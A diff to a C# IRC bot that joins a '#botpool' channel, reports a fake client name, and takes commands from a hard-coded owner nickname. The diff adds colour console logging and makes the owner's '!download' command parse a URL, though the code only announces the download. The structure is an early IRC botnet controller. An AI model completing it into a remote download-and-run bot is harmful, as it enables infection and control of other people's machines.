@@ -8,7 +8,7 @@ namespace IrcBot
         const string realname = "Nick Jones";
         const string channels = "#botpool";
 
-        const string owner_nick = "somebodyrandom24";
+        const string owner_nick = "awfakwfakw";
 
         const string client_software = "KmSPike v3.5";
 
@@ -32,21 +32,21 @@ namespace IrcBot
             Irc irc = (Irc)sender;
             if (e)
             {
-                Console.WriteLine("Connected");
+                Log("Connected", ConsoleColor.Cyan);
                 irc.Ident(nickname, realname);
                 irc.Join(channels);
 
             }
             else
             {
-                Console.WriteLine("Disconnected");
+                Log("Disconnected", ConsoleColor.Red);
             }
         }
 
         private static void Irc_MessageSent(object sender, int e)
         {
             // print that the message was sent
-            Console.WriteLine("[{0}]: Sent {1} characters", DateTime.Now.ToString("hh:mm:ss"), e.ToString());
+            Log(string.Format("Sent {0} characters", e.ToString()), ConsoleColor.DarkGray);
         }
 
         private static void Irc_MessageReceived(object sender, string e)
@@ -58,7 +58,7 @@ namespace IrcBot
             {
                 irc.Send("PONG " + e.Substring(e.IndexOf(':')));
             }
-            int index  = e.IndexOf("PRIVMSG");
+            int index = e.IndexOf("PRIVMSG");
             if (index != -1)
             {
                 int message_start = e.IndexOf(':', index) + 1;
@@ -74,28 +74,31 @@ namespace IrcBot
                     return;
 
                 string sender_nickname = e.Substring(sender_nickname_start, sender_nickname_end - sender_nickname_start);
-                string message = e.Substring(message_start );
+                string message = e.Substring(message_start);
 
-                Console.WriteLine("[[[[[[[[PRIVATE MESSAGE]]]]]]]]]");
-                Console.WriteLine(sender_nickname );
-                Console.WriteLine(message);
+                Log("[Private Message]", ConsoleColor.Red);
+                Log("Sender:  " + sender_nickname, ConsoleColor.Red);
+                Log("Message: " + message, ConsoleColor.Red);
 
-                if (sender_nickname == owner_nick )
+                if (sender_nickname == owner_nick && message.IndexOf("!download") == 0)
                 {
-                    if (message == "!download")
-                    {
-                        irc.Send(string.Format("PRIVMSG {0} :{1}", channels, "Now downloading"));
-                    }
-                }
-
-                if (message == "VERSION")
-                {
-                    irc.Send(string.Format ("PRIVMSG {0} :{1}", sender_nickname, client_software));
+                    string url = message.Substring(
+                        message.IndexOf(' ') + 1
+                    );
+                    irc.Send(string.Format("PRIVMSG {0} :{1}", channels, "Now downloading "+ url));
                 }
             }
 
             // print it out
-            Console.WriteLine("[{0}]: {1}", DateTime.Now.ToString("hh:mm:ss"), e);
+            Log(e, ConsoleColor.Gray);
+        }
+
+        private static void Log(string message, ConsoleColor color)
+        {
+            ConsoleColor previous = Console.ForegroundColor;
+            Console.ForegroundColor = color;
+            Console.WriteLine("[{0}] {1}", DateTime.Now.ToString("hh:mm:ss"), message);
+            Console.ForegroundColor = previous;
         }
     }
 }
